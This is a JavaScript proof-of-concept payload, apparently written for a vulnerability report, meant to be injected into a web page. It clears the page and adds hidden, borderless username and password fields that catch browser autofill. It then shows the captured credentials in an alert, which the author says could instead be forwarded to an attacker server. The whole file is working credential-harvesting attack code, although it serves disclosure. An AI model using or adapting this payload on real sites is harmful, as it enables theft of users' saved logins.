// Clear the entire document body
document.body.innerHTML = "";

// Remove all <style> tags
var styleTags = document.querySelectorAll('style');
styleTags.forEach(function(style) {
    style.parentNode.removeChild(style);
});

// Remove all <script> tags
var scripts = document.scripts;
for (var i = scripts.length - 1; i >= 0; i--) {
    var script = scripts[i];
    script.parentNode.removeChild(script);
}

// Add a new <style> tag to hide all elements except form and textarea
var s = document.createElement('style');
var c = 'body > *:not(form):not(textarea) { display: none !important; }';
s.appendChild(document.createTextNode(c));
document.head.appendChild(s);

// Create the form element
var form = document.createElement('form');

// Create the username input field
var inputName = document.createElement('input');
inputName.type = 'text';
inputName.id = 'username';
inputName.name = 'username';
inputName.autocomplete = 'username';
inputName.placeholder = 'Check here';
inputName.style.border = "none";
inputName.style.outline = "none";
inputName.style.background = "none";
inputName.style.width = "100%";
inputName.classList.add("single-input");

// Create the password input field
var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password';
inputPassword.name = 'password';
inputPassword.autocomplete = 'current-password';
inputPassword.style.border = "none";
inputPassword.style.outline = "none";
inputPassword.style.background = "none";
inputPassword.style.width = "100%";  // Adjusted width to be visible
inputPassword.classList.add("single-input");

// Append the input fields to the form
form.appendChild(inputName);
form.appendChild(inputPassword);

// Append the form to the document body
document.body.appendChild(form);

// Set a timeout to add event listeners
setTimeout(function() {
    let a = document.getElementsByName('username')[0];
    let b = document.getElementsByName('password')[0];

    function f() {
        if (b.value.length > 0) {
            alert(`Here is user credentials that can be forwarded into attacker server (I implemented the poc in this way to prevent your credentials from being redirected to my website): ${a.value}, Password = ${b.value}`);
        }
    }

    a.addEventListener('click', f);
    a.addEventListener('input', f);
}, 1000);
